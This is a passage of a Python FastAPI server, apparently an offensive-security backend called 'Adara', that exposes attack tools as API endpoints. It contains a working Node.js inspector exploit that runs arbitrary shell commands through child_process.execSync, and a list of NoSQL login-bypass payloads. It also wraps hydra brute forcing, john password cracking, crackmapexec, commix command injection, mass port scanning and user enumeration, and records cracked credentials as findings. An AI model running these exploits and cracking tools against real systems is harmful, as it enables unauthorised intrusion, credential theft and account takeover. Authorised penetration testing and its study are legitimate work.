                       "params": {"expression": expression, "returnByValue": True}})
    try:
        _send_text(msg)
        payload_obj = None
        s.settimeout(30)
        while True:
            op, pay = _recv_frame()
            if op == 8:  # close
                break
            if op != 1:
                continue
            try:
                obj = _json.loads(pay)
            except Exception:
                continue
            if obj.get("id") == 1:
                payload_obj = obj
                break
    except Exception as e:
        s.close()
        return False, f"cdp exchange failed: {e}"
    finally:
        try:
            s.close()
        except Exception:
            pass

    if payload_obj is None:
        return False, "no CDP response received"
    if "error" in payload_obj:
        return False, _json.dumps(payload_obj.get("error"))
    r = payload_obj.get("result", {}).get("result", {})
    if "value" in r:
        return True, str(r["value"])
    if "description" in r:
        return True, str(r["description"])
    return False, _json.dumps(r)[:300]

@app.post("/api/tools/node_inspector")
async def node_inspector(req: NodeInspReq):
    import base64
    expr = req.expression.strip()
    if not expr and req.command.strip():
        b64 = base64.b64encode(req.command.encode()).decode()
        expr = ('process.mainModule.require("child_process")'
                f'.execSync(Buffer.from("{b64}","base64").toString()).toString()')
    if not expr:
        expr = "1+1"
    ok, out = await asyncio.to_thread(_node_inspector_exec, req.host, req.port, expr,
                                      req.title_filter, req.timeout)
    return ojson({
        "target": f"{req.host}:{req.port}",
        "method": "shell-command" if req.command and not req.expression else "js-expression",
        "rce": ok,
        "output": out if ok else None,
        "error": None if ok else out,
    })

# ─────────────────────────────────────────────
# NoSQL injection prober — NeDB/Mongo-style operator probing of an HTTP
# login endpoint (username[$ne]=x&password[$ne]=y and JSON equivalents).
# Flags a bypass when a payload's status/Location differs from the baseline
# of bogus creds. This is what sqlmap cannot cover (non-SQL store).
# ─────────────────────────────────────────────
def _nosql_payloads(uf, pf, body_format):
    if body_format == "json":
        return [
            ("$ne/$ne", f'{{"{uf}":{{"$ne":"zzzz"}},"{pf}":{{"$ne":"zzzz"}}}}'),
            ("$gt/$gt", f'{{"{uf}":{{"$gt":""}},"{pf}":{{"$gt":""}}}}'),
            ("$regex/$regex", f'{{"{uf}":{{"$regex":".*"}},"{pf}":{{"$regex":".*"}}}}'),
            ("$exists+$ne", f'{{"{uf}":{{"$exists":true}},"{pf}":{{"$ne":"zzzz"}}}}'),
            ("user+$ne", f'{{"{uf}":"admin","{pf}":{{"$ne":"zzzz"}}}}'),
            ("$ne+pass", f'{{"{uf}":{{"$ne":"zzzz"}},"{pf}":"admin"}}'),
        ]
    return [
        ("$ne/$ne", f"{uf}[$ne]=zzzz&{pf}[$ne]=zzzz"),
        ("$gt/$gt", f"{uf}[$gt]=&{pf}[$gt]="),
        ("$regex/$regex", f"{uf}[$regex]=.*&{pf}[$regex]=.*"),
        ("$exists+$ne", f"{uf}[$exists]=true&{pf}[$ne]=zzzz"),
        ("user+$ne", f"{uf}=admin&{pf}[$ne]=zzzz"),
        ("$ne+user", f"{uf}[$ne]=zzzz&{pf}=admin"),
    ]

def _json_dumps(o):
    import json as _j
    return _j.dumps(o)

async def _nosql_probe(url, method, body, content_type, headers, timeout):
    import shlex
    hdr = " ".join(f"-H {shlex.quote(f'{k}: {v}')}" for k, v in headers.items())
    if content_type:
        hdr += f" -H {shlex.quote('Content-Type: ' + content_type)}"
    cmd = (f"curl -sS -k -m {int(timeout)} -X {method} {hdr} "
           f"-d {shlex.quote(body)} {shlex.quote(url)}")
    res = await run_command(cmd, timeout=int(timeout) + 5)
    stdout = res.get("stdout") or ""
    status = None
    location = ""
    for line in stdout.splitlines():
        low = line.lower()
        if low.startswith("http/"):
            parts = line.split()
            if len(parts) >= 2 and parts[1].isdigit():
                status = int(parts[1])
        elif low.startswith("location:"):
            location = line.split(":", 1)[1].strip()
    return {"status": status, "location": location, "size": len(stdout)}

@app.post("/api/tools/nosql_prober")
async def nosql_prober(req: NosqlReq):
    ct = "application/json" if req.body_format == "json" else "application/x-www-form-urlencoded"
    baseline_body = f"{req.username_field}=zz_nosuchuser&{req.password_field}=zz_nosuchpass"
    if req.body_format == "json":
        baseline_body = f'{{"{req.username_field}":"zz_nosuchuser","{req.password_field}":"zz_nosuchpass"}}'
    baseline = await _nosql_probe(req.url, req.method, baseline_body, ct, req.headers, req.timeout)
    results = []
    flagged = []
    for name, body in _nosql_payloads(req.username_field, req.password_field, req.body_format):
        rr = await _nosql_probe(req.url, req.method, body, ct, req.headers, req.timeout)
        hit = False
        if rr["status"] is not None and baseline["status"] is not None:
            if rr["status"] in req.ok_codes and rr["status"] != baseline["status"]:
                hit = True
            elif rr["location"] and rr["location"] != baseline.get("location"):
                hit = True
        entry = {"payload": name, "body": body, "status": rr["status"],
                 "location": rr["location"], "size": rr["size"],
                 "flag_off": hit}
        results.append(entry)
        if hit:
            flagged.append(entry)
    return ojson({
        "url": req.url,
        "baseline": baseline,
        "attempts": results,
        "likely_bypassed": bool(flagged),
        "flag_count": len(flagged),
    })

# ─────────────────────────────────────────────
# File forensics trio — exiftool (metadata),
# binwalk (signature scan + embedded-file carving),
# foremost (data recovery from raw dumps/images).
# These cover the "hidden file" problem no scanner can
# see — a dropped archive, an injected payload, deleted
# docs — and are pure-CLI, no GUI.
# ─────────────────────────────────────────────
@app.post("/api/tools/exiftool")
async def exiftool(req: ExifReq):
    import shlex
    cmd = f"exiftool {shlex.quote(req.path)} {req.additional_args}"
    result = await _run_or_background(cmd, track="exiftool")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    # Compact the tag dump: keep only the valuable lines, trim the header
    lines = []
    for ln in out.splitlines():
        if ":" in ln and not ln.startswith("ExifTool Version"):
            lines.append(ln.strip())
    result["parsed_tags"] = lines[:60]
    result["tags_total"] = len(lines)
    result["tags_truncated"] = len(lines) > 60
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/binwalk")
async def binwalk(req: BinwalkReq):
    import shlex
    cmd = f"binwalk {shlex.quote(req.path)} {req.additional_args}"
    if req.extract:
        cmd = f"binwalk -e {shlex.quote(req.path)} {req.additional_args}"
    result = await _run_or_background(cmd, track="binwalk")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    # Parse the signature table: lines like "0    0x0    ELF, 64-bit ..."
    findings = []
    for ln in out.splitlines():
        t = ln.strip()
        if t and not t.startswith("DECIMAL") and not set(t) == {"-"}:
            findings.append(t)
    result["parsed_signatures"] = findings[:50]
    result["sig_count"] = len(findings)
    result["sig_truncated"] = len(findings) > 50
    if req.extract:
        # binwalk 2.x always carves into <file>_extracted/ — don't gate this
        # on "extracted" appearing in stdout (binwalk rarely prints it)
        result["extracted_dir"] = req.path.rstrip("/") + "_extracted"
        result["extract_hint"] = ("binwalk -e writes to '<file>_extracted/'. "
                                  "Chain into exiftool/steghide/binwalk on files there.")
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/foremost")
async def foremost(req: ForemostReq):
    import shlex
    cmd = (f"foremost -o {shlex.quote(req.out_dir)} {req.additional_args} "
           f"{shlex.quote(req.path)}")
    result = await _run_or_background(cmd, track="foremost")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    # foremost prints a summary block with "Files:" and file categories
    summary = []
    capture = False
    for ln in out.splitlines():
        if "FILES" in ln.upper() or "File:" in ln:
            capture = True
        if capture:
            summary.append(ln)
    result["parsed_summary"] = summary[:40]
    result["carved_to"] = req.out_dir
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

# ─────────────────────────────────────────────
# High-value additions — each fills a real gap:
#   whatweb        web tech fingerprinting (CMS/framework/JS libs)
#   masscan        ultra-fast whole-range/CIDR port sweep
#   dnsrecon       DNS record / zone-transfer / subdomain enum
#   theHarvester   OSINT email + host discovery
#   cewl           generate target-specific wordlists for hydra/john
#   commix         OS command injection (sqlmap's sibling for RCE)
#   searchsploit   local exploit-db lookups
#   smtp-user-enum SMTP VRFY/EXPN/RCPT user enumeration
#   davtest        WebDAV upload/exec capability testing
#   steghide       stego extract/info (completes the forensics chain)
# ─────────────────────────────────────────────
@app.post("/api/tools/whatweb")
async def whatweb(req: WhatwebReq):
    import shlex
    cmd = f"whatweb {shlex.quote(req.url)} {req.additional_args}"
    result = await _run_or_background(cmd, track="whatweb")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    # whatweb prints one summary line per URL when not using --log-json
    plugins = []
    for ln in out.splitlines():
        if "[" in ln and "]" in ln:
            plugins.append(ln.strip())
    result["parsed_targets"] = plugins[:40]
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/masscan")
async def masscan(req: MasscanReq):
    import shlex
    # Prefer sudo for raw-socket scanning (masscan needs root on most hosts)
    cmd = f"sudo -n masscan {shlex.quote(req.target)} -p {shlex.quote(req.ports)} --rate {req.rate} {req.additional_args}"
    result = await _run_or_background(cmd, track="masscan")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    hosts = []
    for ln in out.splitlines():
        if "Discovered open port" in ln:
            hosts.append(ln.strip())
    result["parsed_hosts"] = hosts[:200]
    result["hosts_found"] = len(hosts)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/dnsrecon")
async def dnsrecon(req: DnsreconReq):
    import shlex
    if req.scan_type == "zone":
        cmd = f"dnsrecon -d {shlex.quote(req.target)} -t zone {req.additional_args}"
    elif req.scan_type == "brt":
        cmd = f"dnsrecon -d {shlex.quote(req.target)} -t brt -D {shlex.quote(req.wordlist)} {req.additional_args}"
    else:
        cmd = f"dnsrecon -d {shlex.quote(req.target)} {req.additional_args}"
    result = await _run_or_background(cmd, track="dnsrecon")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    records = []
    for ln in out.splitlines():
        t = ln.strip()
        # real record rows look like "[*] \t A 192.0.2.1 example.com" (tab after
        # the marker) or "[+] ns -> 192.0.2.1"; info lines have no tab/arrow.
        if t and ("\t" in t or "->" in t):
            records.append(t)
    result["parsed_records"] = records[:100]
    result["record_count"] = len(records)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/theHarvester")
async def theharvester(req: TheHarvesterReq):
    import shlex
    cmd = (f"theHarvester -d {shlex.quote(req.domain)} -b {shlex.quote(req.sources)} "
           f"-l {req.limit} {req.additional_args}")
    result = await _run_or_background(cmd, track="theHarvester")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    emails, hosts = [], []
    section = None
    for ln in out.splitlines():
        t = ln.strip()
        low = t.lower()
        # real headers are "[*] Emails found: N" / "[*] Hosts found: N"
        if "emails found" in low or low.startswith("emails:"):
            section = "emails"
            continue
        if "hosts found" in low:
            section = "hosts"
            continue
        if not t or t.startswith(("[", "*", "-", "=", "_")):
            continue
        if section == "emails" and "@" in t:
            emails.append(t)
        elif section == "hosts":
            host = re.sub(r"^\d+[.)]\s*", "", t)
            if host and "." in host and not host.replace(".", "").replace("-", "").replace(":", "").isdigit():
                hosts.append(host)
    result["emails"] = emails[:100]
    result["hosts"] = hosts[:100]
    result["emails_total"] = len(emails)
    result["hosts_total"] = len(hosts)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/cewl")
async def cewl(req: CewlReq):
    import shlex
    cmd = (f"cewl {shlex.quote(req.url)} -d {req.depth} -m {req.min_length} "
           f"-w {shlex.quote(req.output)} {req.additional_args}")
    result = await _run_or_background(cmd, track="cewl")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    word_count = 0
    try:
        word_count = sum(1 for _ in open(req.output, encoding="utf-8", errors="replace"))
    except Exception:
        pass
    preview = []
    try:
        with open(req.output, encoding="utf-8", errors="replace") as f:
            preview = [ln.strip() for ln in f.readlines()[:30] if ln.strip()]
    except Exception:
        pass
    result["wordlist_path"] = req.output
    result["word_count"] = word_count
    result["preview"] = preview
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/commix")
async def commix(req: CommixReq):
    import shlex
    cmd = f"commix --url {shlex.quote(req.url)} {req.additional_args}"
    if req.data:
        cmd += f" --data={shlex.quote(req.data)}"
    if req.background:
        bg = await start_background_job(cmd, track="commix")
        return ojson(bg)
    result = await _run_or_background(cmd, track="commix")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    low = out.lower()
    injectable = any(p in low for p in (
        "is vulnerable to command injection",
        "appears to be injectable",
        "command injection successful",
        "injection vulnerability",
        "are vulnerable to command injection",
    ))
    result["injectable"] = injectable
    if injectable:
        result["injection_note"] = "Possible OS command injection detected — review output for payloads."
    if result.get("stdout") and len(result["stdout"]) > 20000:
        result["stdout"] = result["stdout"][:20000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/searchsploit")
async def searchsploit(req: SearchsploitReq):
    import shlex
    if req.cve:
        term = f"--cve {shlex.quote(req.cve)}"
    else:
        term = shlex.quote(req.query or "")
    cmd = f"searchsploit {term} {req.additional_args}"
    result = await _run_or_background(cmd, track="searchsploit")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    # rows are "Title | <os>/<category>/<file>" — title first, so key on the
    # pipe separator + a path after it, and drop the header/separator lines.
    # (searchsploit paths are like "multiple/webapps/50383.sh" — no
    # "exploits/" prefix, which the old matcher wrongly required.)
    matches = []
    for ln in out.splitlines():
        t = ln.strip()
        if not t or set(t) == {"-"} or t.lower().startswith("exploit title"):
            continue
        if "|" in t and "/" in t.split("|", 1)[1]:
            matches.append(t)
    result["parsed_matches"] = matches[:40]
    result["matches_total"] = len(matches)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/smtp_user_enum")
async def smtp_user_enum(req: SmtpUserEnumReq):
    import shlex, tempfile
    users = req.usernames
    if req.username_file:
        users = f"-U {shlex.quote(req.username_file)}"
    elif users:
        # smtp-user-enum only honors ONE -u flag — write multiple users to a
        # temp file and use -U instead of repeating -u
        names = [u.strip() for u in users.split(",") if u.strip()]
        if len(names) == 1:
            users = f"-u {shlex.quote(names[0])}"
        else:
            tf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
            try:
                tf.write("\n".join(names))
            finally:
                tf.close()
            users = f"-U {shlex.quote(tf.name)}"
    else:
        users = "-u root"
    cmd = (f"smtp-user-enum -M VRFY -t {shlex.quote(req.host)} -p {req.port} "
           f"{users} {req.additional_args}")
    result = await _run_or_background(cmd, track="smtp-user-enum")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    valid = []
    for ln in out.splitlines():
        if "exists" in ln.lower() or "is valid" in ln.lower():
            valid.append(ln.strip())
    result["valid_users"] = valid[:100]
    result["valid_count"] = len(valid)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/davtest")
async def davtest(req: DavtestReq):
    import shlex
    url = req.url.rstrip("/")
    if req.directory:
        url += "/" + req.directory.lstrip("/")
    cmd = f"davtest -url {shlex.quote(url)} {req.additional_args}"
    result = await _run_or_background(cmd, track="davtest")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    execs = []
    for ln in out.splitlines():
        if "SUCCEED" in ln.upper():
            execs.append(ln.strip())
    result["parsed_exec_ok"] = execs[:50]
    result["exec_count"] = len(execs)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/steghide")
async def steghide(req: SteghideReq):
    import shlex
    if req.action == "info":
        cmd = f"steghide info {shlex.quote(req.file)} {req.additional_args}"
    else:
        cmd = f"steghide extract -sf {shlex.quote(req.file)}"
        # always pass -p (even empty) — JobTracker gives the child NO stdin, so
        # without it steghide blocks on the interactive "Enter passphrase:" prompt
        cmd += f" -p {shlex.quote(req.password)}"
        if req.output:
            cmd += f" -xf {shlex.quote(req.output)}"
        cmd += f" {req.additional_args}"
    result = await _run_or_background(cmd, track="steghide")
    if result.get("auto_backgrounded"):
        return ojson(result)
    out = result.get("stdout") or ""
    stderr = result.get("stderr") or ""
    combined = (out + "\n" + stderr).lower()
    no_data = ("does not contain" in combined or
               "could not extract" in combined or
               "did not find" in combined)
    result["extracted"] = "wrote extracted data" in combined
    # embedded means the carrier held hidden data: extract wrote it out, info
    # reported "has a hidden file", or (extract mode) nothing failed
    result["embedded"] = (not no_data) and (
        "wrote extracted data" in combined or
        "has a hidden file" in combined or
        (req.action == "extract" and "extracted" in combined)
    )
    return ojson(result)

@app.post("/api/tools/hydra")
async def hydra(req: HydraReq):
    if not req.target or not req.service:
        raise HTTPException(400, "target and service are required")
    # FIX: validate credential sources — previously missing both sides emitted
    # '-l "" -L "" -p "" -P ""' and hydra failed with a confusing error
    if not (req.username or req.username_file):
        raise HTTPException(400, "username or username_file is required")
    if not (req.password or req.password_file):
        raise HTTPException(400, "password or password_file is required")

    cmd = "hydra -t 8"
    extra = req.additional_args

    import shlex
    cmd += f" -l {shlex.quote(req.username)}" if req.username else f" -L {shlex.quote(req.username_file)}"
    cmd += f" -p {shlex.quote(req.password)}" if req.password else f" -P {shlex.quote(req.password_file)}"
    cmd += f" {req.target} {req.service} {extra}"

    logger.info(f"Hydra command: {_redact(cmd)}")
    if req.background:
        return ojson(await start_background_job(cmd, track="hydra"))
    result = await _run_or_background(cmd, track="hydra")
    if result.get("auto_backgrounded"):
        return ojson(result)

    # empty hydra output gets diagnostic guidance
    if not result["stdout"] and not result["stderr"]:
        # FIX: {port} was never passed to .format() — KeyError 'port' crashed
        # this branch on every empty hydra output
        port_hint = req.target.rsplit(":", 1)[1] if ":" in req.target and req.target.rsplit(":", 1)[1].isdigit() else "22"
        result["stderr"] = (
            "Hydra returned no output. Common causes:\n"
            "1. SSH KEX/MAC mismatch (old target) — try: update libssh2 or use ncrack instead\n"
            "2. Service not responding — verify with: nc -zv {target} {port}\n"
            "3. Check hydra version: hydra -h 2>&1 | head -1"
        ).format(target=req.target, port=port_hint)
        result["diagnostic"] = "empty_response"

    # Check stderr for known SSH compatibility errors
    if result.get("stderr") and ("kex error" in result["stderr"].lower() or
                                   "no match for method" in result["stderr"].lower()):
        result["diagnostic"] = "ssh_legacy_incompatibility"
        result["suggestion"] = (
            "Hydra's libssh2 doesn't support legacy MAC algorithms used by this target. "
            "Workarounds: (1) Use ncrack instead: ncrack -v --user root -P passwords.txt ssh://{target}:22 "
            "(2) Use metasploit ssh_login module (3) Upgrade hydra/libssh2"
        ).format(target=req.target)

    # save a finding only for real cracks: '[22][ssh] host: ... login: root password: toor'
    # (a bare '[' check matched [DATA]/[ATTEMPT] lines on every run — false positives)
    cred_matches = []
    if result["stdout"]:
        cred_re = re.compile(r'\[\d+\]\[[^\]]+\][^\n]*login:\s*(\S+)\s+password:\s*(\S+)', re.IGNORECASE)
        cred_matches = cred_re.findall(result["stdout"])
    if cred_matches:
        creds = [{"login": u, "password": p} for u, p in cred_matches]
        await _db.save_finding(req.target, "hydra", "creds", "Credentials found",
                         detail=json.dumps(creds), raw_output=result["stdout"],
                         severity="critical", scan_command=_redact(cmd))
        result["credentials_found"] = creds
    if result.get("stdout") and len(result["stdout"]) > 8000:
        # -v/-V attempts dump is noise — keep the tail (summary + any hits)
        result["stdout"] = result["stdout"][-8000:]
        result["stdout"] = "\n...[trimmed, showing tail]...\n" + result["stdout"]
    return ojson(result)

@app.post("/api/tools/john")
async def john(req: JohnReq):
    if not shutil.which("john"):
        return ojson({
            "stdout": "", "stderr": "john not found. Install: sudo apt install john",
            "return_code": 127, "success": False, "timed_out": False, "elapsed_sec": 0,
            "diagnostic": "binary_missing",
            "suggestion": "Install john: sudo apt install john  OR  sudo apt install johntheripper",
        })

    # --show mode only needs the hash file, no wordlist
    is_show_mode = "--show" in (req.additional_args or "")

    if req.hash_file and not os.path.exists(req.hash_file):
        return ojson({
            "stdout": "", "stderr": f"Hash file not found on server: {req.hash_file}",
            "return_code": 1, "success": False, "timed_out": False, "elapsed_sec": 0,
            "diagnostic": "hash_file_missing",
            "suggestion": (
                f"The file '{req.hash_file}' doesn't exist on the Adara server. "
                "Use post_harvest_creds() to extract hashes first, then save them: "
                "execute_command('echo \"<hash_line>\" > /tmp/hashes.txt')"
            ),
        })

    # validate wordlist path, try common fallbacks (skip for --show)
    wordlist = req.wordlist
    if wordlist and not is_show_mode and not os.path.exists(wordlist):
        fallbacks = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/john/password.lst",
            "/usr/share/john/rockyou.txt",
        ]
        found = False
        for fb in fallbacks:
            if os.path.exists(fb):
                if fb.endswith(".gz"):
                    target_path = fb[:-3]
                    if not os.path.exists(target_path):
                        # FIX: decompress off the event loop (was a blocking
                        # subprocess.run freezing every API request) and don't
                        # crash the endpoint if gunzip times out.
                        try:
                            await asyncio.wait_for(
                                asyncio.to_thread(subprocess.run, ["gunzip", "-k", fb], timeout=60),
                                timeout=70,
                            )
                        except (subprocess.TimeoutExpired, asyncio.TimeoutError):
                            logger.warning(f"gunzip timed out for {fb} — skipping decompression")
                    if os.path.exists(target_path):
                        wordlist = target_path
                        found = True
                        break
                else:
                    wordlist = fb
                    found = True
                    break
        if not found:
            logger.warning(f"John wordlist not found: {req.wordlist}, trying without wordlist")
            wordlist = ""
            result_wordlist_missing = True
        else:
            result_wordlist_missing = False
    else:
        result_wordlist_missing = False

    cmd = "john"
    if req.format_type:
        cmd += f" --format={req.format_type}"
    # Only add wordlist if not in --show mode and wordlist is set
    if wordlist and not is_show_mode:
        cmd += f" --wordlist={wordlist}"
    if req.additional_args:
        cmd += f" {req.additional_args}"
    cmd += f" {req.hash_file}"

    logger.info(f"John command: {_redact(cmd)}")
    result = await _run_or_background(cmd, track="john")
    if result.get("auto_backgrounded"):
        return ojson(result)

    # FIX: Add diagnostic when john produces no useful output
    if result_wordlist_missing:
        result["diagnostic"] = "wordlist_missing"
        result["suggestion"] = (
            "No rockyou/dictionary wordlist found — john ran in single/password.lst "
            "mode (near-guaranteed miss). Install wordlists: sudo apt install wordlists "
            "or gunzip /usr/share/wordlists/rockyou.txt.gz, then re-run with "
            "password_file=/usr/share/wordlists/rockyou.txt."
        )
    if not result["stdout"] and not result["stderr"]:
        result["diagnostic"] = "no_output"
        result["suggestion"] = (
            "John produced no output. Common causes: "
            "(1) Hash already cracked — run with additional_args='--show' to see results. "
            "(2) Wrong format — try format_type='md5crypt' or 'sha512crypt'. "
            "(3) Wordlist exhausted without match."
        )
    elif result["stdout"] and not is_show_mode:
        # If cracking happened, add hint to run --show
        result["hint"] = "Run john_crack with additional_args='--show' to see all cracked passwords."
    if result.get("stdout") and len(result["stdout"]) > 8000:
        result["stdout"] = result["stdout"][-8000:]

    return ojson(result)

@app.post("/api/tools/wpscan")
async def wpscan(req: WpscanReq):
    import shlex
    # FIX: binary guard + bounded timeout — a refused/unreachable target made
    # wpscan hang past the MCP ceiling (timeout was 3600s). Refuse fast when
    # wpscan is absent and cap the run so the endpoint always returns.
    if not shutil.which("wpscan"):
        return ojson({
            "stdout": "", "stderr": "wpscan not found. Install: apt install wpscan",
            "return_code": 127, "success": False, "timed_out": False, "elapsed_sec": 0,
            "diagnostic": "binary_missing",
            "suggestion": "Install wpscan: sudo apt install wpscan  (or use nuclei/ffuf for WordPress)"
        })
    additional = req.additional_args
    if req.deep and "--enumerate" not in additional:
        # vp=plugins vt=themes tt=timthumb u=users + aggressive plugin probing
        additional = "--enumerate vp,vt,tt,u --plugins-detection aggressive"
    cmd = f"wpscan --url {shlex.quote(req.url)} {additional}"
    if req.background:
        return ojson(await start_background_job(cmd, track="wpscan"))
    result = await _run_or_background(cmd, track="wpscan")
    if result.get("auto_backgrounded"):
        return ojson(result)
    if result.get("timed_out"):
        result["diagnostic"] = "timed_out"
        result["suggestion"] = (
            f"wpscan exceeded 180s on {req.url} (likely unreachable / refusing "
            "connections). Re-run with background=True for the full scan, or "
            "verify the site is actually serving WordPress."
        )
    if result["stdout"]:
        await _db.save_finding(req.url, "wpscan", "web", "WPScan results", raw_output=result["stdout"], scan_command=_redact(cmd))
        # Auto-CVE/PoC hook (FIX M3): 'WordPress 6.4.3', '[+] plugin: x version
        # 1.2' etc. get CVE + PoC lookups automatically like nmap does.
        try:
            enrich = await _enrich_stdout(
                req.url, "wpscan(auto-CVE+POC hook)", result["stdout"])
            if enrich:
                result = {**result, **enrich}
        except Exception as e:
            logger.debug(f"auto-CVE enrichment skipped: {e}")
        if len(result["stdout"]) > 12000:
            result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/enum4linux")
async def enum4linux(req: Enum4linuxReq):
    import shlex
    # FIX: Check if enum4linux is available, fall back to enum4linux-ng
    binary = "enum4linux"
    if not shutil.which(binary):
        if shutil.which("enum4linux-ng"):
            binary = "enum4linux-ng"
        else:
            return ojson({
                "stdout": "", "stderr": "enum4linux not found. Install: apt install enum4linux",
                "return_code": 127, "success": False, "timed_out": False, "elapsed_sec": 0,
                "diagnostic": "binary_missing",
                "suggestion": "Install enum4linux: sudo apt install enum4linux  OR  use smbclient -L //{target} -N as alternative".format(target=req.target)
            })

    cmd = f"{binary} {req.additional_args} {shlex.quote(req.target)}"
    logger.info(f"Enum4linux command: {_redact(cmd)}")
    result = await _run_or_background(cmd, track="enum4linux")
    if result.get("auto_backgrounded"):
        return ojson(result)
    if not result["stdout"] and not result["stderr"]:
        result["stderr"] = (
            f"{binary} produced no output for {req.target}. "
            "Possible causes: SMB port 445 not open, or null sessions disabled."
        )
        result["diagnostic"] = "empty_response"
    if result["stdout"]:
        await _db.save_finding(req.target, "enum4linux", "smb", "Enum4linux results", raw_output=result["stdout"], scan_command=_redact(cmd))
        if len(result["stdout"]) > 16000:
            result["stdout"] = result["stdout"][:16000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/crackmapexec")
async def crackmapexec(req: CrackMapExecReq):
    import shlex
    # FIX: Try crackmapexec first, then netexec (successor), then fallback to smbclient
    binary = None
    for candidate in ["crackmapexec", "netexec", "nxc"]:
        if shutil.which(candidate):
            binary = candidate
            break

    if not binary:
        # Fallback: use smbclient for basic share listing
        if req.service.lower() == "smb" and shutil.which("smbclient"):
            cmd = f"smbclient -L //{shlex.quote(req.target)} -N"
            if req.username and req.password:
                cmd = f"smbclient -L //{shlex.quote(req.target)} -U {shlex.quote(req.username)}%{shlex.quote(req.password)}"
            logger.info(f"CrackMapExec fallback to smbclient: {_redact(cmd)}")
            result = await run_command(cmd, timeout=30)
            result["diagnostic"] = "crackmapexec_not_installed_used_smbclient"
            return ojson(result)

        return ojson({
            "stdout": "", "stderr": "crackmapexec/netexec not found.",
            "return_code": 127, "success": False, "timed_out": False, "elapsed_sec": 0,
            "diagnostic": "binary_missing",
            "suggestion": "Install: sudo apt install crackmapexec  OR  sudo pipx install netexec"
        })

    cmd = f"{binary} {req.service} {shlex.quote(req.target)}"
    if req.username:
        cmd += f" -u {shlex.quote(req.username)}"
    if req.password:
        cmd += f" -p {shlex.quote(req.password)}"
    if req.deep:
        # null session only lists the banner — deep adds the juicy modules
        req.additional_args += " --shares --users --pass-pol"
    if req.additional_args:
        cmd += f" {req.additional_args}"
    logger.info(f"CrackMapExec command: {_redact(cmd)}")
    result = await _run_or_background(cmd, track="crackmapexec")
    if result.get("auto_backgrounded"):
        return ojson(result)
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/netcat_probe")
async def netcat_probe(req: NetcatConnectReq):
    """Non-interactive nc probe — connect, optionally send data, read response.
    FIX: Use protocol-aware connection. FTP/SMTP/POP3/IMAP send banners immediately,
    but only after the TCP connection is established. Use nc -w with a proper read.
    """
    timeout = max(float(req.timeout), 5.0)  # minimum 5 seconds (float preserved)

    # Determine what data to send based on port if not specified
    data = req.data_to_send
    if not data:
        # Protocol hints for common ports — send newline/greeting to trigger banner
        PORT_HINTS = {
            21:   "\r\n",        # FTP — sends 220 banner after connection
            22:   "",            # SSH — sends banner immediately
            25:   "EHLO test\r\n",  # SMTP
            80:   "HEAD / HTTP/1.0\r\n\r\n",  # HTTP
            110:  "\r\n",        # POP3
            143:  "\r\n",        # IMAP
            443:  "",            # HTTPS (won't work without TLS)
            3306: "\n",          # MySQL
            5432: "\n",          # PostgreSQL
        }
        data = PORT_HINTS.get(req.port, "\r\n")

    # Strategy 1: echo data | nc with verbose flag for connection status
    # FIX: shlex.quote — the old %-escape only guarded printf format strings,
    # and raw interpolation of data into a shell string executed $(id)/
    # backticks/';' in user-supplied data (command injection on the server).
    import shlex
    # FIX: printf '%b' (not '%s') so \r\n escapes in data are interpreted —
    # '%s' sent literal backslashes, so HTTP/SMTP/FTP hints produced no real
    # CRLF, the server never completed the request, and nc hung to timeout.
    if data:
        cmd = f"printf '%b' {shlex.quote(data)} | nc -n -w {timeout} -v {shlex.quote(req.host)} {req.port} 2>&1"
